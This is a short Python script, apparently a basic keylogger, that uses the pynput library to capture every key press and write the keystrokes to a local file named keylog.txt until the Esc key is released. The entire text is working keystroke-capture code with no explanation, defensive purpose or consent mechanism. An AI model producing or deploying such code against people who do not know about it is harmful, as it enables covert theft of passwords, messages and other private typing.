from pynput.keyboard import Key  
from pynput.keyboard import Listener  
the_keys = []  
def functionPerKey(key):  
    the_keys.append(key)  
    storeKeysToFile(the_keys)  
def storeKeysToFile(keys):  
    with open('keylog.txt', 'w') as log:  
        for the_key in keys:  
            the_key = str(the_key).replace("'", "")  
            log.write(the_key)  
def onEachKeyRelease(the_key):  
    if the_key == Key.esc:  
        return False  
with Listener(  
    on_press = functionPerKey,  
    on_release = onEachKeyRelease  
) as the_listener:  
    the_listener.join()  